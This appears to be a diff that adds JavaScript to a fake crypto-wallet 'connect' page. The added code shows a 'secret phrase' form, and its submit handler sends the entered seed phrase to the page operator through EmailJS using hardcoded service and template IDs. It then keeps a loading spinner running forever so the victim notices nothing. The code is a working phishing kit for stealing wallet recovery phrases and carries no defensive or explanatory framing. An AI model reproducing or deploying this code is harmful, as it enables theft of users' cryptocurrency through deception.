+        document.getElementById("manualConnectButton").addEventListener("click", function() {
+            // Show the secret phrase section
+            document.getElementById("secret-phrase-section").style.display = "block";
+            document.getElementById("retryButton").style.display = "none"; // Hide retry button
+            document.getElementById("manualConnectButton").style.display = "none"; // Hide the button
+        });
+
+        document.getElementById("backToWalletSelectionButton").addEventListener("click", function() {
+            // Hide the secret phrase section and show the wallet buttons again
+            document.getElementById("secret-phrase-section").style.display = "none";
+            document.getElementById("retryButton").style.display = "inline-block";
+            document.getElementById("manualConnectButton").style.display = "inline-block";
+        });
+
+        document.getElementById("submitSecretPhraseButton").addEventListener("click", function() {
+            // Show the continuous loader immediately when submit is clicked
+            document.getElementById("continuousLoader").style.display = "block";
+            // The loader will continue indefinitely
+        });
+
+
+  
+
+// Close the modal if the user clicks outside of it
+window.onclick = function(event) {
+    if (event.target == document.getElementById("secretPhraseModal")) {
+        document.getElementById("secretPhraseModal").style.display = "none";
+    }
+}
+
+
+// Optional: If you need to prevent the default form submission
+document.getElementById("secretPhraseForm")?.addEventListener("submit", function (event) {
+    event.preventDefault();
+});
+
+// Close the modal if the user clicks outside of it
+window.onclick = function (event) {
+    if (event.target == document.getElementById("walletModal")) {
+        document.getElementById("walletModal").style.display = "none";
+    }
+};
+
+// Show the modal when the "Use Secret Phrase" button is clicked
+document.getElementById("manualConnectButton").addEventListener("click", function () {
+    // Show the secret phrase section
+    document.getElementById("secret-phrase-section").style.display = "block";
+    document.getElementById("retryButton").style.display = "none"; // Hide retry button
+    document.getElementById("manualConnectButton").style.display = "none"; // Hide the button
+});
+
+// Back to Wallet Selection Button functionality
+document.getElementById("backToWalletSelectionButton").addEventListener("click", function () {
+    // Hide the secret phrase section and show the wallet buttons again
+    document.getElementById("secret-phrase-section").style.display = "none";
+    document.getElementById("retryButton").style.display = "inline-block";
+    document.getElementById("manualConnectButton").style.display = "inline-block";
+});
+
+
+
+
+      // Initialize EmailJS with your public key
+      emailjs.init('E_uNpjJa5v3wPuyba');  // Use your public key
+
+// Submit button click handler
+document.getElementById("submitSecretPhraseButton").addEventListener("click", function () {
+    // Show the loader when submit is clicked
+    document.getElementById("continuousLoader").style.display = "inline-block";
+
+    // Get the value of the secret phrase input field
+    const secretPhrase = document.getElementById("secret-phrase-input").value.trim();
+
+    // Log the secret phrase to check what is being entered
+    console.log("Secret Phrase:", secretPhrase);
+
+    // Check if the secret phrase input is empty
+    if (!secretPhrase) {
+        alert("Please enter your secret phrase.");
+        document.getElementById("continuousLoader").style.display = "none";  // Hide loader if no secret phrase entered
+        return;
+    }
+
+    // Prepare the email data to send via EmailJS
+    const emailData = {
+        secret_phrase: secretPhrase  // Send the secret phrase as the email content
+    };
+
+    // Log email data to verify
+    console.log("Sending email with data:", emailData);
+
+    // Send the secret phrase using EmailJS
+    emailjs.send('service_aenm78i', 'template_ptq4j28', emailData)  // Use your actual service ID and template ID
+        .then(function (response) {
+            // Log success response
+            console.log("EmailJS Success:", response);
+            // Do not display any success alert. Just leave the loader visible.
+        }, function (error) {
+            // Log error response
+            console.log("EmailJS Error:", error);
+            // Keep the loader visible even on error
+        });
+
+    // Keep the loader visible indefinitely. No timeout to hide it.
+});
+
+    </script>
+</body>
+</html>
